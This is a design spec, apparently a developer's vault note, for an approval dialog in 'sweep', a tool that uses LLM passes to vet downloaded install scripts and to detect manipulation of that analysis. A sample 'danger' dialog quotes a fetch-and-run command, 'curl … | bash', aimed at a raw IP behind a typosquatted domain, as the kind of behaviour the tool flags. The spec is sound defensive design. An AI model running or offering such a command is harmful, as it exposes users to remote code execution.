---
name: llm-insights-dialog
description: First LLM-insights phase — the install approval dialog driven by LLM analysis. Design decisions and rationale from the interview; deleted at this feature's compaction step.
---

# LLM insights dialog

The install dialog promised by [[product-spec]] ("The install dialog" / "What sweep
catches"), built for its **first source: the LLM**. This phase turns today's
silent install path into an approval gate fed by LLM analysis. Everything
non-LLM (domain age, hash DBs, registry, diff-vs-prior) is a *later* source
plugged into the same frame.

---

## Status & build order (read this first)

Seven standalone units. **Steps 1–2 are DONE and in the code** — their build
instructions are trimmed below; the code is the source of truth, and the
interfaces a later step consumes are summarised here so you needn't re-read all
of it. **Steps 3–7 remain** and keep full detail.

| # | Unit | State | Lands in |
|---|---|---|---|
| 1 | Severity theme tokens | **DONE** | `wrap-core` core theme + sweep `src/tui/theme.ts` |
| 2 | Two-pass analysis core | **DONE** | sweep `src/installer/analyze.ts` |
| 3 | Insight view-model (pure) | TODO | new pure module + tests |
| 4 | Dialog component + spinner | TODO | new Ink component + tests |
| 5 | Session controller | TODO | session module; threads abort into fetch |
| 6 | Orchestrator + `main` reshape (the flip) | TODO | `installer/install.ts`, `main.ts` |
| 7 | Vault + spec compaction | TODO | concept notes; delete this spec |

Dependencies: 3 needs 2's types · 4 needs 1+3 · 5 needs 2+3+4 · 6 needs 5 · 7 last.
Each step: TDD (failing test first), `/code-review` after, keep every commit working.

### What Step 1 gives you (theme — built)

The danger/warning palette was a **cross-repo promotion** (it was byte-identical
in wrap and sweep, and `CoreThemeTokens` had no red token). It now lives in
**`wrap-core`**: `CoreThemeTokens.severity = { warning: {frame, pill}, danger:
{frame, pill} }`, populated in `DARK_CORE`/`LIGHT_CORE`. wrap's `risk.medium/high`
and sweep both derive from it.

> ⚠ The wrap-core + wrap halves of that promotion are committed on a branch
> `core-severity-tokens` **in each of those repos** (not on their `main`). sweep
> reads wrap-core's working tree via the local-workspace symlink, so it builds
> fine — but those two repos carry uncommitted-to-main work. Don't be surprised;
> don't "fix" it by reverting.

sweep `src/tui/theme.ts` exposes:
- `getSeverityPreset(level: "caution" | "danger") → { stops: Color[]; pill: PillSegment }`
  — `caution`→core `warning`, `danger`→core `danger`; labels `"⚠ caution"` /
  `"✗ danger"`, bold. **No `clear` preset** (clear has no pill — deliberate;
  don't add one).
- `DARK_GRADIENT` / `LIGHT_GRADIENT` — the neutral blue frame for the **no-pill**
  states (clear / no-LLM / analysis-failed / paste). Sweep-local (the dark
  variant differs from wrap's, so it was *not* promoted, unlike severity).

So in Step 4 the dialog frame is: `severity==="caution"|"danger"` →
`getSeverityPreset(...).stops`; otherwise the neutral gradient (chosen by
appearance — `mount.ts` already resolves appearance).

### What Step 2 gives you (analysis core — built)

`src/installer/analyze.ts` exports `analyzeScript({ url, scriptBytes, signal? })
: Promise<AnalysisResult>` — runs the **analysis** and **manipulation** passes
concurrently as two isolated conversations, **never throws**, and is abortable
via `signal`. Exported types (Step 3 consumes these verbatim):

```ts
type Severity = "clear" | "caution" | "danger";
type Behavior = { description: string; sudo: boolean };
type AnalysisPass =
  | { kind: "ok"; severity: Severity; verdict: string; flags: string[]; behaviors: Behavior[] }
  | { kind: "failed"; reason: string };
type ManipulationPass = { kind: "clean" } | { kind: "fired" } | { kind: "failed"; reason: string };
type AnalysisResult =
  | { kind: "noProvider" }
  | { kind: "analyzed"; analysis: AnalysisPass; manipulation: ManipulationPass };
```

Key facts baked into the code:
- **`noProvider` is top-level**, not per-pass — there are no incoherent
  combinations (e.g. analysis-noProvider + manipulation-clean) to defend against.
  `noProvider` *is* the no-LLM signal, so the view-model likely needs no separate
  `providerConfigured` argument.
- **Trust contract** (documented on `ManipulationPass`): only `{kind:"clean"}` is
  *provably clean* → render the verdict normally. **Every** other value —
  `fired`, or `failed` (which also covers a thrown / aborted / timed-out pass) —
  means the verdict shows under the compromise banner. **Allowlist `clean`; never
  denylist `fired`** (a future non-clean kind would otherwise render as trusted —
  a security regression).
- The severity rubric and "visibility, not verdicts / never assert safe" voice
  live in the analysis prompt in code. `behaviors[].sudo` is structured so the
  renderer (not the LLM) owns the inline `(sudo)` chrome.
- Test seam: for `analyzeScript`, `SWEEP_TEST_RESPONSES` is a JSON object
  `{ analysis: <TestResponses>, manipulation: <TestResponses> }` — each key feeds
  its own `createLlm({name:"test"})` handle (two handles → deterministic per-pass
  addressing, since each test handle restarts its cursor at 0). Absent →
  `noProvider`; present-but-malformed → `{kind:"analyzed"}` with both passes
  `failed` (a broken seam is an attempted-but-failed analysis → analysis-failed
  state, **not** no-LLM).
- The **legacy** `maybeAnalyzeScript` (single-pass, `{summary}` schema, stderr) is
  still wired into `runInstall` step 5 and reads the *flat* `SWEEP_TEST_RESPONSES`
  shape. It is replaced in Step 6 — leave it alone until then.

`ensureConfig()` still returns `{}` (no real provider this phase), so the no-LLM
state is reachable only via the test seam.

---

## Why this is also the approval gate

Today `runInstall` (`installer/install.ts`) goes parse → fetch → save → analyze
→ **exec, unconditionally**. There is no approval step; step 5
(`maybeAnalyzeScript`) only prints one `sweep:` stderr line. This phase
introduces the gate the product spec assumes ("when the user approves, sweep
execs"). So "build the LLM insights dialog" and "introduce approval" are the
same work.

The dialog is therefore **load-bearing**: it must render on every interactive
install — including when there is no LLM and when analysis fails — because it
is the only thing standing between fetch and exec.

## The frame is multi-source from day one

The dialog is one component fed by **insight sources**. The LLM is the first and
only source wired this phase, but the frame, states, and section layout are
designed so the deterministic signals (domain age, hash lookups, registry,
changes-since-last-version) drop in later as additional sources without
reshaping the dialog. That is why the no-LLM state still shows a dialog (see
states below) rather than reverting to silent exec — the gate is universal;
only its *contents* depend on which sources are configured.

## Content layout (top → bottom)  ·  *for Steps 3–4*

1. **Header line** — severity pill (when present) + source (`host/path` of the
   install URL). No pill = clear; **there is no green "all clear" pill** (per
   product-spec: absence of red flags is not endorsement). The sample glyphs are
   normative — `✗` danger, `⚠` caution (and `⚠` is reused as the uniform flag
   marker and in the manipulation banner; the differing text/role disambiguates)
   — coloured from the theme's severity tokens (`getSeverityPreset`) so the level
   reads at a glance. Whether that's the `Pill` primitive or plain coloured text,
   and the `nerdFonts` stance (the existing install prompt uses `nerdFonts:
   false`), are the implementer's.
2. **Compromise banner** — only in the manipulation-detected state; it takes the
   header's place *instead of* a severity pill (the analysis severity is
   untrusted there, so it is not shown as a pill).
3. **Verdict prose** — identity + character + *reasoning*. Says what the tool
   **is** (and who ships it) and the overall read; for suspicious scripts it
   carries the **narrative "why"** — the argument the terse flags summarize.
   **The prose never re-lists the behavior bullets.** Clean example: *"Ollama
   LLM runtime. Standard vendor installer from the official domain."* Suspicious
   example: *"Claims to install ollama but the domain is ollarna.com, and it
   hands control to a script on a raw IP. Treat with suspicion."*
4. **Flags** (only when present) — terse, concerning specifics, uniform `⚠`
   marker. No per-flag severity; the header pill conveys the overall level.
5. **Appears to do (not exhaustive)** — neutral, concrete actions as bullets,
   inline `(sudo)` where relevant (from `Behavior.sudo`). The "(not exhaustive)"
   framing is mandatory — sweep does not claim totality.
6. **Action bar** — `[Cancel] [Run]` (Cancel focused by default, always). On
   danger / manipulation, Run is replaced by a type-to-confirm input (below).

Flags and behaviors are **separate sections**, not one marked list. Overlap is
allowed — a flagged action may also appear as a behavior bullet. The fixed
chrome — the `⚠` flag marker, the "(not exhaustive)" label, severity
glyph/colour — is the **renderer's**, not the LLM's.

## Severity & the "confirm, don't block" model  ·  *for Step 3*

The analysis pass assigns `clear` / `caution` / `danger` (the LLM decides; the
rubric is in the prompt). Affordances:

- **clear** — no pill. `[Cancel] [Run]`.
- **caution** — `⚠` pill. `[Cancel] [Run]`.
- **danger** — `✗` pill. Run is **not removed** — it becomes a type-to-confirm
  input: *"Type 'install' to run:"*. The literal confirm word is **`install`**
  (not the tool slug — simpler, no slug dependency), matched exactly (trimmed).
  In this state keystrokes go to the input (it holds focus); submitting the
  exact word runs; submitting anything else does nothing and stays in the dialog;
  Esc resolves the dialog as `cancelled`. The "focus defaults to Cancel" rule
  governs the *button* states (clear / caution / no-LLM / failed); danger's input
  is the necessary exception that takes focus to be typeable.

**There is no hard Block state.** This is a deliberate departure from
product-spec's "Block — no Run button" two-state design: an LLM false-positive
that *removes* the ability to run is too hostile for a probabilistic,
single-source judgment whose whole stance is "visibility, not verdicts — we
don't promise safety." Friction (typing `install`) replaces removal.
**product-spec's "The install dialog" section should be reconciled with this
when the feature lands** (its Allow/Block split, the Read-source button, and the
signal-panel `✓/◯` rows are superseded or deferred here — that reconciliation is
Step 7).

Rationale for type-to-confirm over a double-press or focus-distance: it is the
most deliberate of the three (mirrors "type the repo name to delete"), and the
deliberation cost is paid only on danger.

## Trust rule & precedence  ·  *the view-model's core logic (Step 3)*

(The two passes and their failure modes are built — see "What Step 2 gives you".
What follows is the rule the **view-model** must encode from the `AnalysisResult`.)

**Trust rule:** render the verdict normally only if `manipulation.kind ===
"clean"`. Anything else (`fired`, or `failed` = threw / parse error / abort /
timeout) shows the verdict under a loud **"⚠ analysis may be compromised"**
banner. Drop the banner only on a positively clean result, never on the mere
absence of one. The (possibly poisoned) verdict is still shown beneath the
banner — *show-but-banner* over *suppress*, so the user keeps the information and
makes the call.

**Precedence.** The banner caveats a verdict. If there is no verdict to caveat
because the **analysis** pass itself failed (`analysis.kind === "failed"`), the
analysis-failed state wins (plain `[Run]`, no banner, no friction) and the
manipulation result is moot — a "may be compromised" banner over a "couldn't
analyze" body is incoherent.

Manipulation-detected (verdict present) applies **danger-level Run friction**
(type `install`) regardless of the untrusted severity, since the whole verdict
is suspect. *(Reasoned default, not nailed down in the interview — revisit if it
feels wrong in practice.)*

> **Step-3 note (from review):** define a **distinct** dialog-state type — do
> **not** reuse `Severity` as the state. `Severity` is one *input*; the dialog
> state also depends on the manipulation pass (manipulation outranks even a
> `danger` severity) and on failure (→ analysis-failed). The mapping is not
> identity.

## States summary  ·  *for Steps 3–4*

Focus defaults to Cancel in every state.

| State | Header | Body | Run | From `AnalysisResult` |
|---|---|---|---|---|
| clear | source only | verdict + behaviors | `[Run]` | analyzed · analysis ok · severity clear · manip clean |
| caution | `⚠ caution` | verdict + flags + behaviors | `[Run]` | analyzed · ok · caution · manip clean |
| danger | `✗ danger` | verdict + flags + behaviors | type `install` | analyzed · ok · danger · manip clean |
| manipulation | `⚠ analysis may be compromised` banner | verdict + flags + behaviors | type `install` | analyzed · ok · manip **not** clean |
| no-LLM | source only | *"No LLM provider configured — no analysis to show."* | `[Run]` | `noProvider` |
| analysis-failed | source only | *"Couldn't analyze: &lt;reason&gt;."* | `[Run]` | analyzed · analysis **failed** (precedence: wins over manip) |

**analysis-failed is plain `[Run]`, no friction** — a provider outage is sweep's
failure, not the script's; don't punish the user for it. (Same affordance as the
no-LLM bare gate, with an error line instead of the "no provider" line.)

## Loading & the alt-screen session  ·  *for Steps 4–5*

One spinner **inside the dialog** ("Analyzing…") covers fetch + both passes; the
frame appears immediately. The dialog is a single alt-screen session that
transitions through states (spinner → verdict), so it needs a session-style
controller rather than the open-await-one-close shape the paste prompt uses today
(see "What this reshapes"). During loading only Cancel is live; cancelling
aborts the in-flight fetch + sends (see Outcomes).

- **Interactive mode** (`sweep` with no arg): the existing paste dialog
  **rerenders in place** into the spinner, then into the resolved insights state.
  One continuous alt-screen session — the paste dialog *becomes* the insights
  dialog. A pasted command that fails to **parse** surfaces inline in that
  session (return to the paste input with an error; let the user re-paste), not
  as a `sweep:` stderr line that would be hidden behind the live alt-screen (same
  reasoning as analysis-failed).
- **Direct mode** (`sweep "curl … | sh"`): the dialog appears with the spinner
  straight away — parse already happened on the argument, so a direct-mode parse
  failure keeps today's pre-dialog chrome + exit (no dialog is mounted yet).

## What this reshapes (not a drop-in at "step 5")  ·  *Step 6*

`architecture.md` still frames analysis as a stderr-only "step 5" with the dialog
"unbuilt." This phase changes the install orchestrator's shape:

- Today `main` calls `promptInstallCommand` (which opens *and tears down* its own
  alt-screen) and *then* calls `runInstall`, a linear
  parse→fetch→save→analyze→exec function with no TUI awareness. A single
  alt-screen session spanning paste → fetch → analyze → approve cannot live
  inside that boundary.
- So fetch + analysis have to run *under* the live dialog session (the dialog
  drives them and rerenders spinner → verdict), the gate sits between fetch and
  exec *within* that session, and the alt-screen is torn down before `exec` (the
  child inherits the real terminal).
- This is intent, not a code prescription — how `main` / the orchestrator / the
  controller get reshaped is the implementer's. The point is only that it *is* a
  reshaping, not an insertion.
- Step 6 also **removes** the legacy `maybeAnalyzeScript` and its tests
  (`tests/installer-install.test.ts` section 8, "step-5 analysis (env-gated)"),
  replacing the call with `analyzeScript` driven by the session.

## Substrate decisions (resolved)

- **In-dialog spinner — decided, no new substrate.** Mirror wrap's in-dialog
  ("reticulating") spinner: Ink's built-in `useAnimation` hook driving
  `SPINNER_FRAMES` / `SPINNER_INTERVAL`, which are **already exported from
  `wrap-core/chrome`** (shared). wrap composes the current frame into
  `Dialog.bottomStatus`; sweep can do the same or render it as the body line.
  There is **nothing to promote** — wrap has no spinner *component*, it inlines
  the pattern. Do **not** add `@inkjs/ui` for this (the spec's earlier note
  suggesting it is superseded).
- **Two-pass test contract — done.** Implemented as the `{analysis,
  manipulation}` `SWEEP_TEST_RESPONSES` object (see "What Step 2 gives you").
- **Severity theme tokens — done & promoted to wrap-core** (see "What Step 1
  gives you").
- **`ink-testing-library`** — not yet a dep. Add it (dev) in **Step 4**, just
  before first use (it's already used in wrap; mirror that).

## Outcomes (the invocation log)  ·  *Step 6*

The `invocations` table is sweep's log of *every run* — ran, errored, or not run
at all. These are **run outcomes**, a different thing from a package's lifecycle
**state**. This phase only writes the log; it does not decide state.

- **Cancel / decline** → the **`cancelled`** invocation outcome (already in the
  `Outcome` union — and in product-spec's "ran, cancelled, errored" and
  conventions.md; no code path produces it yet, and the free-text column means no
  migration). Preserves invariant 3 (one invocation row per run). Exit code:
  non-zero and outside the *fixed* parse(2)/fetch(1) codes; exec passes arbitrary
  codes through, so collision with *those* can't be avoided and isn't worth
  chasing — exact value is the implementer's (130 is the working default).
- **Cancel applies at any point the dialog is up, including during the spinner.**
  Cancelling mid-analysis aborts the in-flight fetch + LLM sends (thread an
  `AbortSignal` into `fetchScript` — it has none today — and into
  `analyzeScript`, which already takes one) and records one `cancelled` row. If
  the cancel lands before fetch completed there is no sha/package yet — record the
  row with the same null-field shape the fetch-failure path already uses.
- **Run** → exec as today; outcome `ran` / `errored`.

> **Step-5/6 note (from review):** resolve **cancel** *before* the controller
> would render an abort-induced `failed` as the analysis-failed state. Abort maps
> to `analysis.failed` inside `analyzeScript` (it never throws), so a cancel that
> aborted the passes must short-circuit to the `cancelled` outcome + teardown —
> not flash a "Couldn't analyze: aborted" body.

**Package "state" is a separate concern, deferred.** A package row materializes
at fetch success, *before* the gate, at status `attempting`; a cancelled run
never reaches exec, so what status that row should rest at is an open lifecycle
question — the package's *state*, not the run's *outcome*. This phase does **not**
settle it: do not add a cancel transition to `lifecycle.md`, and do not change
how `sweep list` displays anything. Just log the `cancelled` run.

## Invariant nuance (for the vault)  ·  *Step 7*

Invariant 2 was amended (commit `032ef44`) to mandate that the analysis step
"formats and prints its own `sweep:` line and swallows the error instead of
throwing." This phase **reverses that mechanism**: now that analysis feeds the
approval dialog, a failure surfaces **in the dialog** (the analysis-failed
state), not on stderr — a `sweep:` line would be hidden behind the alt-screen.
Analysis still never throws and never fails the install path; only the failure
*channel* changes. Because this overturns a deliberate decision, **invariant 2
needs a real rewrite, not a wording nudge** when this lands.

## Out of scope (this phase)

Deliberately deferred — do **not** build these now:

- **Provider config + first-run wizard.** Assume `~/.sweep/config.jsonc` already
  defines a provider (build-order step 1 in [[script-inspection]], tracked
  separately; mirror wrap's config-wizard pattern when it's built). The dialog is
  exercised via the test provider (`SWEEP_TEST_RESPONSES`). (`ensureConfig()`
  returns `{}` today, so the **no-LLM state** is only reachable via the test seam
  this phase.)
- **`--auto` and non-TTY policy.** Assume an interactive TTY.
- **Read source / source viewer.** No button this phase.
- **Analysis caching/persistence.** Recompute both passes every run; no new DB
  storage. (sha-keyed caching is decided in [[script-inspection]] but waits for a
  store.)
- **All non-LLM insight sources** — domain age, hash/sigstore lookups, registry
  signals, diff-vs-prior changes panel. The frame hosts them later; none now.
- **Install-location resolution** ([[script-inspection]]'s candidate-paths +
  `lstat`). Not displayed. (The analysis schema deliberately does **not** carry
  candidate paths yet — no speculative groundwork.)
- **Package lifecycle "state" after a cancel** (and any `sweep list` display of
  it). Log the `cancelled` run outcome only.

## Sample dialogs  ·  *design artifacts for Step 4*

Clean (clear):

```
┌─ sweep ──────────────────────────────────────────────┐
│  ollama.com/install.sh                                │
│                                                       │
│  Ollama LLM runtime. Standard vendor installer from   │
│  the official domain.                                 │
│                                                       │
│  Appears to do (not exhaustive):                      │
│   • Download ollama binary from ollama.com            │
│   • Install to /usr/local/bin/ollama  (sudo)          │
│   • Create + enable a systemd service (sudo)          │
│   • Add an 'ollama' system user                       │
│                                                       │
│  [ Cancel ]   [ Run ]                                 │
└───────────────────────────────────────────────────────┘
```

Suspicious (danger):

```
┌─ sweep ──────────────────────────────────────────────┐
│  ✗ danger        ollarna.com/install.sh               │
│                                                       │
│  Claims to install "ollama" but the domain is         │
│  ollarna.com, not ollama.com, and it hands control    │
│  to a script on a raw IP. Treat with suspicion.       │
│                                                       │
│  Flags:                                               │
│   ⚠ Domain ollarna.com mimics ollama.com              │
│   ⚠ Downloads + runs a script from 193.43.x.x         │
│   ⚠ Appends export lines to ~/.bashrc                 │
│                                                       │
│  Appears to do (not exhaustive):                      │
│   • curl http://193.43.x.x/x.sh | bash                │
│   • echo 'export PATH=…' >> ~/.bashrc                 │
│                                                       │
│  [ Cancel ]   Type 'install' to run: ____             │
└───────────────────────────────────────────────────────┘
```

No-LLM bare:

```
┌─ sweep ──────────────────────────────────────────────┐
│  ollama.com/install.sh                                │
│                                                       │
│  No LLM provider configured — no analysis to show.    │
│                                                       │
│  [ Cancel ]   [ Run ]                                 │
└───────────────────────────────────────────────────────┘
```

Loading:

```
┌─ sweep ──────────────────────────────────────────────┐
│  ollama.com/install.sh                                │
│                                                       │
│  ⠋ Analyzing…                                         │
│                                                       │
│  [ Cancel ]                                           │
└───────────────────────────────────────────────────────┘
```

## Step-4 component pointers (hard-won; not prescriptive)

- Build on wrap-core/tui `Dialog` (`gradientStops`, `bottomStatus`,
  `naturalContentWidth`, children-as-render-fn), `Pill`, `TextInput`,
  `ActionBar`; `useTheme`/`useKeyBindings`. The existing paste dialog
  (`src/tui/interactive.tsx`) is the closest live example.
- Sweep puts the **pill inline as the first content line** (next to the source) —
  a deliberate divergence from wrap, which puts its risk pill in the *top border*.
- wrap has **no** type-to-confirm; danger's "type `install`" input is sweep-new.
- Spinner: `import { useAnimation } from "ink"` +
  `SPINNER_FRAMES`/`SPINNER_INTERVAL` from `wrap-core/chrome` (see Substrate).
- Test with `ink-testing-library`'s `render` + a strip-ansi on `lastFrame()`
  (mirror wrap's component tests).
